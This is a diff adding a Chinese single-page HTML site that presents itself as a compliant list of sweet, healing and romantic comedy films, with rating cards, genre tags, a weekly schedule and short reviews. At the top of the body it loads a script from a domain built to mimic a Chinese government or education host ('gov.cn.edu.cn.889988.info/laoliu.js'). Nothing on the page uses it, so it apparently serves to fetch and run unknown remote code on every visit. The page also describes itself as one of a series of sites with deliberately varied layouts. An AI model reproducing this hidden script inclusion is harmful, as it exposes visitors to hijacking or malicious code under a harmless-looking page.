@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>甜光影单网 - 甜宠/治愈/爱情/轻喜剧电影片单 | tianxindianyingwang-h5.github.io</title>
+<meta name="description" content="甜光影单网（tianxindianyingwang-h5.github.io）整理甜宠、治愈、爱情、青春轻喜剧与周末放松电影片单及短影评；合规影单站，不提供盗版播放。" />
+<meta name="keywords" content="甜光影单网, tianxindianyingwang-h5, 甜宠电影推荐, 治愈系电影片单, 爱情轻喜剧, 周末观影指南" />
+<meta name="author" content="甜光影单网" />
+<meta name="robots" content="index,follow" />
+<meta name="theme-color" content="#e8728c" />
+<link rel="canonical" href="https://tianxindianyingwang-h5.github.io/" />
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"甜光影单网",
+  "url":"https://tianxindianyingwang-h5.github.io/",
+  "description":"甜宠、治愈、爱情、青春轻喜剧与周末放松电影片单",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://tianxindianyingwang-h5.github.io/#search?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#fff5f7; --ink:#3a2230; --muted:#8a6b78;
+  --line:#f3d7df; --card:#ffffff;
+  --pri:#e8728c; --pri2:#ffb86b; --soft:#a6d8c8; --violet:#b79be0;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;line-height:1.8;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1140px;margin:0 auto;padding:0 18px;}
+
+/* 顶部 */
+.top{position:sticky;top:0;z-index:100;background:var(--pri);color:#fff;border-bottom:3px solid var(--pri2);}
+.top-in{display:flex;align-items:center;justify-content:space-between;height:64px;}
+.brand{font-weight:900;font-size:20px;}
+.brand small{display:block;font-size:10px;opacity:.8;font-weight:400;}
+.nav{display:flex;gap:20px;font-size:14px;}
+.nav a:hover{color:var(--pri2);}
+.navbtn{display:none;width:42px;height:42px;border:none;border-radius:10px;background:var(--pri2);color:#5a2a36;font-size:20px;cursor:pointer;}
+
+/* Hero 心形气泡 */
+.hero{padding:56px 0 38px;position:relative;overflow:hidden;background:
+  radial-gradient(420px 220px at 12% 0%,rgba(255,184,107,.35),transparent),
+  radial-gradient(520px 260px at 92% 20%,rgba(183,155,224,.28),transparent),
+  linear-gradient(180deg,#fff,#fff5f7);
+  border-bottom:1px solid var(--line);}
+.bubble{position:absolute;border-radius:50%;background:rgba(232,114,140,.18);filter:blur(2px);}
+.b1{width:120px;height:120px;left:6%;top:30px;}
+.b2{width:70px;height:70px;right:14%;top:80px;background:rgba(255,184,107,.30);}
+.b3{width:46px;height:46px;left:40%;bottom:20px;background:rgba(166,216,200,.40);}
+.hero h1{font-size:32px;margin:0 0 12px;position:relative;}
+.hero h1 em{font-style:normal;color:var(--pri);}
+.hero p{color:var(--muted);max-width:600px;margin:0 0 20px;position:relative;}
+.srch{display:flex;gap:10px;max-width:520px;position:relative;}
+.srch input{flex:1;padding:13px 16px;border:2px solid var(--line);border-radius:14px;font-size:15px;}
+.srch button{padding:13px 22px;border:none;border-radius:14px;background:var(--pri);color:#fff;font-weight:800;cursor:pointer;}
+
+/* 栏目 */
+.zone{padding:40px 0;border-bottom:1px solid var(--line);}
+.zh{margin-bottom:22px;}
+.zh h2{font-size:25px;margin:0 0 4px;color:var(--pri);}
+.zh span{color:var(--muted);font-size:14px;}
+
+/* 栏目1：甜度评级卡 */
+.sweet-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;}
+.sweet{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:18px;position:relative;overflow:hidden;}
+.sweet .bar{height:8px;border-radius:8px;background:linear-gradient(90deg,var(--pri),var(--pri2));margin-bottom:12px;}
+.sweet:nth-child(2) .bar{background:linear-gradient(90deg,var(--soft),#7fc7b0);}
+.sweet:nth-child(3) .bar{background:linear-gradient(90deg,var(--violet),#d7c4f5);}
+.sweet:nth-child(4) .bar{background:linear-gradient(90deg,#ffd36b,#ff9aa2);}
+.sweet:nth-child(5) .bar{background:linear-gradient(90deg,#9ad0ff,#b79be0);}
+.sweet:nth-child(6) .bar{background:linear-gradient(90deg,#ffb86b,#e8728c);}
+.sweet h3{font-size:17px;margin:0 0 4px;}
+.sweet p{margin:0;color:var(--muted);font-size:13px;}
+.sweet .score{position:absolute;top:16px;right:18px;font-size:13px;font-weight:800;color:var(--pri);}
+
+/* 栏目2：类型泡泡 */
+.pills{display:flex;flex-wrap:wrap;gap:12px;}
+.pill{border:1px solid var(--line);background:var(--card);border-radius:999px;padding:11px 18px;font-size:14px;}
+.pill b{color:var(--pri);}
+
+/* 栏目3：周末日程表 */
+.schedule{display:grid;grid-template-columns:repeat(7,1fr);gap:10px;}
+.day{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px 10px;text-align:center;min-height:120px;}
+.day b{display:block;color:var(--pri);font-size:13px;margin-bottom:6px;}
+.day span{font-size:12px;color:var(--muted);}
+
+/* 栏目4：短影评 卡片左图右文 */
+.reviews{display:grid;grid-template-columns:1fr 1fr;gap:18px;}
+.rv{display:flex;gap:14px;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:16px;}
+.rv .thumb{width:64px;height:64px;border-radius:14px;flex-shrink:0;}
+.rv:nth-child(1) .thumb{background:linear-gradient(135deg,#e8728c,#ffb86b);}
+.rv:nth-child(2) .thumb{background:linear-gradient(135deg,#a6d8c8,#7fc7b0);}
+.rv:nth-child(3) .thumb{background:linear-gradient(135deg,#b79be0,#d7c4f5);}
+.rv:nth-child(4) .thumb{background:linear-gradient(135deg,#9ad0ff,#b79be0);}
+.rv h3{font-size:16px;margin:0 0 4px;}
+.rv p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1.25fr .75fr;gap:18px;}
+.box{border:1px solid var(--line);border-radius:16px;padding:20px;background:var(--card);}
+.box ul{padding-left:18px;color:var(--muted);}
+.box li{margin:6px 0;}
+.warn{background:#fff0f3;border-left:4px solid var(--pri);padding:12px 14px;border-radius:0 10px 10px 0;color:#a23a52;font-size:13px;margin-top:12px;}
+
+footer{background:var(--pri);color:#ffe3ea;padding:30px 0 38px;font-size:13px;text-align:center;}
+footer a{color:var(--pri2);}
+
+@media(max-width:900px){
+  .sweet-grid{grid-template-columns:1fr 1fr;}
+  .schedule{grid-template-columns:repeat(3,1fr);}
+  .reviews{grid-template-columns:1fr;}
+  .about{grid-template-columns:1fr;}
+}
+@media(max-width:640px){
+  .nav{display:none;flex-direction:column;position:absolute;top:64px;left:0;right:0;background:var(--pri);padding:10px 0;}
+  .nav.open{display:flex;}
+  .nav a{padding:12px 20px;border-bottom:1px solid rgba(255,255,255,.12);}
+  .navbtn{display:block;}
+  .hero h1{font-size:25px;}
+  .sweet-grid{grid-template-columns:1fr;}
+  .schedule{grid-template-columns:repeat(2,1fr);}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="top">
+  <div class="wrap top-in">
+    <div class="brand">甜光影单网<small>tianxindianyingwang-h5.github.io</small></div>
+    <button class="navbtn" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+    <nav class="nav" id="nav">
+      <a href="#sweet">甜度片单</a>
+      <a href="#types">甜系类型</a>
+      <a href="#weekend">周末日程</a>
+      <a href="#reviews">短影评</a>
+      <a href="#about">关于 / 合规</a>
+    </nav>
+  </div>
+</div>
+
+<section class="hero">
+  <span class="bubble b1"></span><span class="bubble b2"></span><span class="bubble b3"></span>
+  <div class="wrap">
+    <h1>甜光影单网：<em>给生活加点糖，但不过度甜</em></h1>
+    <p>原词「甜心电影网」容易做成免费影视聚合/擦边短剧站。本站转义为甜宠、治愈、爱情、青春轻喜剧片单站——适合周末、约会、雨天、深夜一个人慢慢看。不提供盗版播放、不挂网盘、不碰成人向内容。</p>
+    <form class="srch" onsubmit="return false;">
+      <input type="text" placeholder="搜索：甜宠 / 治愈系 / 爱情轻喜剧 / 周末放松" aria-label="搜索" />
+      <button type="submit">搜索</button>
+    </form>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <section class="zone" id="sweet">
+    <div class="zh"><h2>🍬 甜度片单</h2><span>按“甜度”挑电影</span></div>
+    <div class="sweet-grid">
+      <div class="sweet"><div class="bar"></div><div class="score">甜度 30%</div><h3>情书</h3><p>青春暗恋、雪与借书卡，甜里带酸，后劲很大。</p></div>
+      <div class="sweet"><div class="bar"></div><div class="score">甜度 45%</div><h3>怦然心动</h3><p>梧桐树、鸡蛋、少年少女的价值观碰撞，干净又上头。</p></div>
+      <div class="sweet"><div class="bar"></div><div class="score">甜度 60%</div><h3>爱在黎明破晓前</h3><p>维也纳一夜长聊，成年人的浪漫是“我愿意继续走”。</p></div>
+      <div class="sweet"><div class="bar"></div><div class="score">甜度 75%</div><h3>时空恋旅人</h3><p>能穿越时间，却选每天重新爱上你，甜到想哭。</p></div>
+      <div class="sweet"><div class="bar"></div><div class="score">甜度 85%</div><h3>陪安东尼度过漫长岁月</h3><p>独白、猫、墨尔本，轻得像棉花糖的治愈系。</p></div>
+      <div class="sweet"><div class="bar"></div><div class="score">甜度 95%</div><h3>时空恋旅人 / 真爱至上</h3><p>圣诞、告白牌、机场拥抱——甜宠合集级放松片。</p></div>
+    </div>
+  </section>
+
+  <section class="zone" id="types">
+    <div class="zh"><h2>🎀 甜系类型</h2><span>想看什么情绪，直接选</span></div>
+    <div class="pills">
+      <div class="pill"><b>#</b> 甜宠爱情</div>
+      <div class="pill"><b>#</b> 治愈系</div>
+      <div class="pill"><b>#</b> 青春暗恋</div>
+      <div class="pill"><b>#</b> 轻喜剧</div>
+      <div class="pill"><b>#</b> 周末放松</div>
+      <div class="pill"><b>#</b> 约会片单</div>
+      <div class="pill"><b>#</b> 雨天独处</div>
+      <div class="pill"><b>#</b> 异地恋</div>
+      <div class="pill"><b>#</b> 重逢向</div>
+      <div class="pill"><b>#</b> 动物治愈</div>
+    </div>
+  </section>
+
+  <section class="zone" id="weekend">
+    <div class="zh"><h2>📅 周末观影日程</h2><span>周一到周日，不重样</span></div>
+    <div class="schedule">
+      <div class="day"><b>周一</b><span>轻喜剧<br>下班解压</span></div>
+      <div class="day"><b>周二</b><span>青春暗恋<br>慢节奏</span></div>
+      <div class="day"><b>周三</b><span>治愈系<br>配热可可</span></div>
+      <div class="day"><b>周四</b><span>爱情长聊<br>成年人浪漫</span></div>
+      <div class="day"><b>周五</b><span>甜宠新片<br>周末预热</span></div>
+      <div class="day"><b>周六</b><span>约会双片<br>下午+晚上</span></div>
+      <div class="day"><b>周日</b><span>重看老片<br>收心明天</span></div>
+    </div>
+  </section>
+
+  <section class="zone" id="reviews">
+    <div class="zh"><h2>📝 短影评</h2><span>一句一个甜点</span></div>
+    <div class="reviews">
+      <div class="rv"><div class="thumb"></div><div><h3>《怦然心动》</h3><p>“有些人浅薄，有些人金玉其外败絮其中；但总有一天，你会遇到彩虹般的人。”这部片把暗恋拍成了价值观启蒙。</p></div></div>
+      <div class="rv"><div class="thumb"></div><div><h3>《时空恋旅人》</h3><p>能回到过去却用来多爱一遍家人——它表面是爱情，内核是“珍惜此刻还在的人”。</p></div></div>
+      <div class="rv"><div class="thumb"></div><div><h3>《情书》</h3><p>甜的不是恋爱，是“我偷偷喜欢过你，连名字都借书卡上写满”——最纯的糖是没说出口。</p></div></div>
+      <div class="rv"><div class="thumb"></div><div><h3>《爱在》三部曲</h3><p>从黎明聊到正午再到黄昏，爱情不是瞬间心动，是“我还想跟你再走一段”。</p></div></div>
+    </div>
+  </section>
+
+  <section class="zone" id="about">
+    <div class="zh"><h2>📌 关于甜光影单网</h2><span>转义说明</span></div>
+    <div class="about">
+      <div class="box">
+        <h3>为什么不是“甜心电影网”</h3>
+        <p>“甜心电影网/甜心影院”类名字在网上常对应免费影视聚合、韩剧短剧、擦边推荐。本站只保留“甜”的情绪，转义为<b>甜宠 / 治愈 / 爱情轻喜剧片单站</b>。</p>
+        <ul>
+          <li>甜度片单：情书 / 怦然心动 / 爱在三部曲 / 时空恋旅人</li>
+          <li>甜系类型：甜宠、治愈、青春暗恋、轻喜剧、约会片单</li>
+          <li>周末日程：周一到周日不重样，降低“剧荒”成本</li>
+          <li>短影评：只讲情绪价值，不剧透关键结局</li>
+        </ul>
+        <div class="warn">
+          合规边界：不提供盗版在线播放、不挂网盘/磁力/提取码、不使用成人/情色/走光分类。
+          看正版请走爱奇艺、腾讯视频、优酷、B站、院线与版权方授权渠道。
+        </div>
+      </div>
+      <div class="box">
+        <h3>站点信息</h3>
+        <p>网址：<br><b>https://tianxindianyingwang-h5.github.io/</b></p>
+        <p>单页演示，内链均为 <a href="#">#</a> 占位；不生成 robots.txt 与 sitemap.xml。</p>
+        <p>本页用奶油粉橘调、心形气泡 Hero、甜度评级卡、周末日程表，和同系列其他站 DOM/视觉均不同。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    甜光影单网 · tianxindianyingwang-h5.github.io ｜ 甜宠 / 治愈 / 爱情 / 轻喜剧电影片单（合规影单站）<br>
+    所有内链均为 # 占位；页面结构、配色与 DOM 均独立设计。
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});
+});
+</script>
+</body>
+</html>
